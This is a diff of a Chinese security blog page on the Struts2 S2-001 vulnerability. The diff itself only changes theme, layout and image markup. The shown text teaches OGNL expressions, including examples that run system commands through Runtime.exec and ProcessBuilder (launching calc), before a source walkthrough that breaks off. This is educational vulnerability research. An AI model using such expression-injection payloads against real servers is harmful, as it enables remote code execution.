@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>Struts2-S2-001 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/04/10/Struts2-S2-001/">
+<link rel="canonical" href="https://curlysean.github.io/2025/04/10/Struts2-S2-001/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-04-10T13:55:00.000Z">2025.04.10</time></div>
-      <div><span>更新</span><time datetime="2025-04-10T13:55:00.000Z">2025.04.10</time></div>
-      <div><span>阅读</span><strong>34 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,11 +118,17 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#A2dAE"><span class="toc-text">Struts2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#okABs"><span class="toc-text">Struts2简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gVTVp"><span class="toc-text">OGNL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wigu8"><span class="toc-text">OGNL简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#grkut"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iq2U1"><span class="toc-text">OGNL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XNDha"><span class="toc-text">OGNL三要素</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#QIcnf"><span class="toc-text">OGNL基础使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#OHdzZ"><span class="toc-text">对ROOT对象的访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DZvEL"><span class="toc-text">对上下文对象的访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#G3044"><span class="toc-text">对静态变量与静态方法的访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#VcMvP"><span class="toc-text">方法的调用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ISv3E"><span class="toc-text">对数组和集合的访问</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#GRoiG"><span class="toc-text">投影与选择</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rl2c0"><span class="toc-text">创建对象</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WwGPD"><span class="toc-text">S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AHCsG"><span class="toc-text">漏洞影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IItvL"><span class="toc-text">流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RyS8z"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lc9Hh"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IKwBa"><span class="toc-text">总结</span></a></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#okABs"><span class="toc-text">Struts2简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gVTVp"><span class="toc-text">OGNL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wigu8"><span class="toc-text">OGNL简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#grkut"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iq2U1"><span class="toc-text">OGNL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XNDha"><span class="toc-text">OGNL三要素</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#QIcnf"><span class="toc-text">OGNL基础使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WwGPD"><span class="toc-text">S2-001</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AHCsG"><span class="toc-text">漏洞影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IItvL"><span class="toc-text">流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RyS8z"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lc9Hh"><span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IKwBa"><span class="toc-text">总结</span></a></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-04-10T13:55:00.000Z">2025.04.10</time></div>
+        <div><span>更新</span><time datetime="2025-04-10T13:55:00.000Z">2025.04.10</time></div>
+        <div><span>阅读</span><strong>约 15 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
         <h1 id="A2dAE">Struts2</h1>
 <h2 id="okABs">Struts2简介</h2>
@@ -160,7 +181,7 @@ OGNL使用一种链式风格进行对对象的访问
 <p>对应代码如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;sean&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>(<span class="string">&quot;045000&quot;</span>, <span class="string">&quot;山西晋中&quot;</span>);</span><br><span class="line">        user.setAddress(address);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;name&quot;</span>, user));   <span class="comment">// sean</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;name.length()&quot;</span>, user));     <span class="comment">// 4</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;address&quot;</span>, user).toString());    <span class="comment">// Address(port=045000, address=山西晋中)</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;address.port&quot;</span>, user));   <span class="comment">// 045000</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743413953947-619c8050-27cc-44e5-a2f7-45cdf4a4012a.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743413953947-619c8050-27cc-44e5-a2f7-45cdf4a4012a.png" alt="Struts2-S2-001" loading="lazy"></p>
 <h5 id="DZvEL">对上下文对象的访问</h5>
 使用OGNL的时候，若不设置上下文对象，系统就会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象的参数，则会使用传入的上下文对象
 
@@ -168,7 +189,7 @@ OGNL使用一种链式风格进行对对象的访问
 <p>对应代码如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;sean&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>(<span class="string">&quot;045000&quot;</span>, <span class="string">&quot;山西晋中&quot;</span>);</span><br><span class="line">        user.setAddress(address);</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        context.put(<span class="string">&quot;init&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#init&quot;</span>, context, user));</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#user.name&quot;</span>, context, user));</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;age&quot;</span>, context, user));</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#user&quot;</span>, context, user));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414317040-52b9c38e-17a8-44ab-9bd8-5edd3f543993.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414317040-52b9c38e-17a8-44ab-9bd8-5edd3f543993.png" alt="Struts2-S2-001" loading="lazy"></p>
 <h5 id="G3044">对静态变量与静态方法的访问</h5>
 
 <p>同样的，OGNL也可以对静态变量和静态方法进行调用，格式如<code>\@[class]@[field/method ()]</code></p>
@@ -179,14 +200,14 @@ OGNL使用一种链式风格进行对对象的访问
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Static</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABC</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>其中调用静态方法时的返回的object2，是基于静态方法的返回值，这里师傅们可以自行修改尝试</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414846060-1e5b8688-714f-4518-b698-dbd8362f0680.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414846060-1e5b8688-714f-4518-b698-dbd8362f0680.png" alt="Struts2-S2-001" loading="lazy"></p>
 <h5 id="VcMvP">方法的调用</h5>
 如果需要调用 Root 对象或者上下文对象当中的方法也可以使用 . 方法的方式来调用。甚至可以传入参数。就和正常的方法调用是一样的，在传参时也可以使用OGNL表达式来传入参数
 
 <p>对应代码如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        context.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;sean&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;getName()&quot;</span>, context, user)); <span class="comment">// null</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;setName(#name)&quot;</span>, context, user);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;getName()&quot;</span>, context, user)); <span class="comment">// sean</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;setName(@com.Static@exec(\&quot;calc\&quot;))&quot;</span>, context, user);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;getName()&quot;</span>, context, user)); <span class="comment">// exec</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415413505-4b044844-1002-440a-8390-99167ac92663.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415413505-4b044844-1002-440a-8390-99167ac92663.png" alt="Struts2-S2-001" loading="lazy"></p>
 <h5 id="ISv3E">对数组和集合的访问</h5>
 OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问
 
@@ -196,7 +217,7 @@ OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用
 <p>对应代码如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        String[] strings  = &#123;<span class="string">&quot;aa&quot;</span>, <span class="string">&quot;bb&quot;</span>&#125;;</span><br><span class="line">        ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;bb&quot;</span>);</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;key2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">        context.put(<span class="string">&quot;strings&quot;</span>, strings);</span><br><span class="line">        context.put(<span class="string">&quot;map&quot;</span>, map);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#strings[0]&quot;</span>, context, user));   <span class="comment">// aa</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list[0]&quot;</span>, context, user));  <span class="comment">// aa</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list[0 + 1]&quot;</span>, context, user));  <span class="comment">// bb</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#map[&#x27;key1&#x27;]&quot;</span>, context, user));  <span class="comment">// value1</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#map[&#x27;key&#x27; + &#x27;2&#x27;]&quot;</span>, context, user));     <span class="comment">// value2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415917014-5830d2ce-6920-4740-80a9-d81d812c4a34.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415917014-5830d2ce-6920-4740-80a9-d81d812c4a34.png" alt="Struts2-S2-001" loading="lazy"></p>
 <h5 id="GRoiG">投影与选择</h5>
 OGNL 支持类似数据库当中的选择与投影功能
 
@@ -217,7 +238,7 @@ OGNL 支持类似数据库当中的选择与投影功能
 <p>对应代码如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name1&quot;</span>, <span class="number">11</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name2&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">p3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name3&quot;</span>, <span class="number">33</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">p4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name4&quot;</span>, <span class="number">44</span>);</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        ArrayList&lt;User&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;User&gt;();</span><br><span class="line">        list.add(p1);</span><br><span class="line">        list.add(p2);</span><br><span class="line">        list.add(p3);</span><br><span class="line">        list.add(p4);</span><br><span class="line">        context.put(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;age&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [11, 22, 33, 44]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;age + &#x27;-&#x27; + name&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [11-name1, 22-name2, 33-name3, 44-name4]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;? #this.age &gt; 22&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [User(name=name3, age=33, address=null), User(name=name4, age=44, address=null)]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;^ #this.age &gt; 22&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [User(name=name3, age=33, address=null)]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;$ #this.age &gt; 22&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [User(name=name4, age=44, address=null)]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416558563-5643dad0-3c42-4d74-9e17-5ec548c5c1fa.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416558563-5643dad0-3c42-4d74-9e17-5ec548c5c1fa.png" alt="Struts2-S2-001" loading="lazy"></p>
 <h5 id="rl2c0">创建对象</h5>
 OGNL支持直接使用表达式来创建对象，其中有三种情况
 
@@ -228,12 +249,12 @@ OGNL支持直接使用表达式来创建对象，其中有三种情况
 </ul>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#&#123;&#x27;key1&#x27;:&#x27;value1&#x27;,&#x27;key2&#x27;:&#x27;value2&#x27;&#125;&quot;</span>, <span class="literal">null</span>)); <span class="comment">// &#123;key1=value1&#125;</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;&#123;&#x27;key1&#x27;,&#x27;value1&#x27;&#125;&quot;</span>, <span class="literal">null</span>));  <span class="comment">// [key1, value1]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;new pojo.User()&quot;</span>, <span class="literal">null</span>));</span><br><span class="line"><span class="comment">// User(name=null, age=0, address=null)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416950403-6e977822-33e9-4594-a8cb-c28b5ef35528.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416950403-6e977822-33e9-4594-a8cb-c28b5ef35528.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>这里可以直接创建任意对象，感觉就很有攻击面了，可以直接命令执行</p>
 <p>代码如下，两者皆可执行</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException &#123;  </span><br><span class="line">        Ognl.getValue(<span class="string">&quot;new java.lang.ProcessBuilder(new java.lang.String[]&#123;\&quot;calc\&quot;&#125;).start()&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line"></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(\&quot;calc\&quot;)&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743417080780-c2bdd739-a3ec-4342-9543-3f88616143f1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743417080780-c2bdd739-a3ec-4342-9543-3f88616143f1.png" alt="Struts2-S2-001" loading="lazy"></p>
 <h2 id="WwGPD">S2-001</h2>
 <h3 id="AHCsG">漏洞影响范围</h3>
 
@@ -255,32 +276,32 @@ OGNL支持直接使用表达式来创建对象，其中有三种情况
 <li>获取 ActionMapping 对象, ActionMapping 对象对应一个action详细配置信息</li>
 <li>执行 Action 请求, 也就是 <code>serviceAction()</code>方法</li>
 </ul>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743486857729-0d588b21-c03e-4a0d-b43d-952c40642242.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743486857729-0d588b21-c03e-4a0d-b43d-952c40642242.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>在<code>doFilter</code>方法中下到断点，前面做了一些基础的数据转换和获取，最后我们跟进<code>serviceAction</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487680234-4a92ef29-b605-49cb-84de-19414a5e52f5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487680234-4a92ef29-b605-49cb-84de-19414a5e52f5.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>首先获取当前请求是否已经有<code>ValueStack</code>对象，如果是接收到chain跳转方式的请求时，能够接管上次请求的请求和数据。</p>
 <p>如果没有 ValueStack 对象，获取当前线程的ActionContext对象；如果有 ValueStack 对象，将事先处理好的请求中的参数 put 到 ValueStack 中</p>
 <p>后续获取 ActionMapping 中配置的 namespace, name, method 值</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487932957-581b5af6-a0ea-4619-a88e-066b73d942da.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487932957-581b5af6-a0ea-4619-a88e-066b73d942da.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>这里通过<code>ActionProxyFactory</code>创建了<code>ActionProxy</code>对象，在这个过程中也会创建<code>StrutsActionProxy</code>的实例，<code>StrutsActionProxy</code>是继承自<code>com.opensymphony.xwork2.DefaultActionProxy</code>，实际在该代理对象的内部就持有了<code>DefaultActionInvocation</code>的实例，下一步就为Action代理对象设置执行的方法。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489041006-a5d29050-e6d7-4ce2-bc57-10cfc06d65e8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489041006-a5d29050-e6d7-4ce2-bc57-10cfc06d65e8.png" alt="Struts2-S2-001" loading="lazy"></p>
 <p>继续跟进到<code>proxy.execute()</code>方法内，可以看到这里获取了上下文，并用setter方法赋值上下文</p>
